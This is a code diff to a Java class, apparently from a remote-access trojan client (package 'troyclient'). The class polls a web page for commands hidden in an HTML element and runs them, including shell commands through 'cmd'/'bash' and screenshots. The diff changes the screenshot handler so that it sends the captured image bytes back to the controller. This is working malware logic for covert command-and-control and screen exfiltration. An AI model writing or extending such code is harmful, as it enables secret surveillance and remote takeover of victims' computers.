@@ -3,7 +3,6 @@ package ch.lebois.troyclient.main;
 import ch.lebois.troyclient.chat.Chat;
 import ch.lebois.troyclient.functions.ListFilesFunction;
 import ch.lebois.troyclient.functions.Screenshot;
-import ch.lebois.troyclient.main.GetContext;
 import ch.lebois.troyclient.service.*;
 
 public class CommandReciver {
@@ -18,8 +17,11 @@ public class CommandReciver {
     }
 
     public String[] getWebsiteCommands() {
-        return webHandler.getContent().split("id=\"commands\">")[1].split("</pre>")[0]
+
+        String[] content = webHandler.getContent().split("id=\"commands\">")[1].split("</pre>")[0]
                 .replace("\\r", "").split("\\n");
+
+        return content;
     }
 
     public void readCommands() {
@@ -27,7 +29,7 @@ public class CommandReciver {
             for (String command : getWebsiteCommands()) {
                 switch (command.toLowerCase()) {
                     case "screenshot":
-                        sender.send("screen", "Screenshot taken '" + Screenshot.takeScreenshot() + "'");
+                        new ImageSender().sendBytes(new Screenshot().takeScreenshot());
                         break;
                     case "cmd":
                     case "bash":
